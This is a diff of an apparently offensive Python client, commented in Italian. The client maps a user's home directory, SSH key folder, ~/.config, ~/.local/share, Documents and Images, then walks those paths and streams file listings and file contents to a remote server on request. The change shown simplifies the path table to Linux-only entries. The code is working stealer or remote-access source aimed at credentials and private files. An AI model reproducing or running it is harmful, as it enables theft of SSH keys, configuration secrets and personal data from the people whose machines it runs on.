@@ -32,20 +32,13 @@ __headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-
 
 __os_dict_types = {0: "linux", 1: "win32", 2: "darwin"}  # Partiamo da 0 in modo da porte accedere al'i-esimo elemento nella lista contenuta in __filesystem_hierarchy
 
-__filesystem_hierarchy = {"Root": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
-                          "Home": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
-                          "SSH KEYS": [f"/home/{os.getlogin()}/.ssh/", f"C:/Users/{os.getlogin()}/.ssh/", f"/Users/{os.getlogin()}/.ssh/"],  # SSH KEYS
-                          "Images": [f"/home/{os.getlogin()}/Immagini", f"C:/Users/{os.getlogin()}/Immagini", f"/Users/{os.getlogin()}/Immagini"],  # Recupero Immagini (?)
-                          "Documents": [f"/home/{os.getlogin()}/Documenti", f"C:/Users/{os.getlogin()}/Documenti", f"/Users/{os.getlogin()}/Documenti"],  # Recupero Documenti (?)
+__filesystem_hierarchy = {"Home": f"/home/{os.getlogin()}/",  # TODO: Exclude path from research
+                          "Images": f"/home/{os.getlogin()}/Immagini",  # TODO: Generalize for LANG
+                          "Documents": f"/home/{os.getlogin()}/Documenti",  # TODO: Generalize for LANG
+                          "SSH Keys": f"/home/{os.getlogin()}/.ssh/",  # ~/.ssh/*
+                          "Config": f"/home/{os.getlogin()}/.config/",  # ~/.config/*
+                          "local": f"/home/{os.getlogin()}/.local/share"  # ~/.local/share/*
                           }
-
-__filesystem_hierarchy_tmp = {"Home": f"/home/{os.getlogin()}/",  # TODO: Exclude path from research
-                              "Images": f"/home/{os.getlogin()}/Immagini",  # TODO: Generalize for LANG
-                              "Documents": f"/home/{os.getlogin()}/Documenti",  # TODO: Generalize for LANG
-                              "SSH Keys": f"/home/{os.getlogin()}/.ssh/",  # ~/.ssh/*
-                              "Config": f"/home/{os.getlogin()}/.config/",  # ~/.config/*
-                              "local": f"/home/{os.getlogin()}/.local/share"  # ~/.local/share/*
-                              }
 
 """
 Per semplicità le funzioni utilizzate dal writer sono parametrizzate utilizzando i campi presenti negli __headers_type (per una migliore gestione dei casi)
@@ -131,15 +124,15 @@ async def get_users(writer: asyncio.StreamWriter) -> None:
 
 
 # Da preferire in quanto non restituisce nulla nel caso in cui si stia cercando di leggere una directory senza permessi
-def get_path_content(content_path: str, sys_type: int) -> list:
+def get_path_content(content_path: str) -> list:
     """Funzione per il recupero del contenuto di directory e file dato un path."""
     current_position = __filesystem_hierarchy.get(content_path)
     total_files = []
-    if content_path == "Root":
-        for single_dir in os.listdir(current_position[sys_type]):
-            total_files.append(os.path.join(current_position[sys_type], single_dir))
+    if content_path == "Home":
+        for single_dir in os.listdir(current_position):
+            total_files.append(os.path.join(current_position, single_dir))
     else:
-        for path, dirs, files in os.walk(current_position[sys_type]):
+        for path, dirs, files in os.walk(current_position):
             for filename in files:
                 total_files.append(os.path.join(path, filename))
     return total_files
@@ -167,9 +160,9 @@ async def send_file(request: str, size: int, writer: asyncio.StreamWriter):
         writer.write(__headers_type["1-2"] + request.encode())
 
 
-async def send_dir_content(request: str, os_type: int, writer: asyncio.StreamWriter):
+async def send_dir_content(request: str, writer: asyncio.StreamWriter):
     """Gestione dell'invio del contenuto di uno specifico PATH richiesto dal server."""
-    for files in get_path_content(request, os_type):  # Utilizziamo la variabile globale che viene settata all'avvio del client
+    for files in get_path_content(request):
         writer.write(__headers_type["9"] + files.encode())
         await asyncio.sleep(1)
     writer.write(__headers_type["10"])
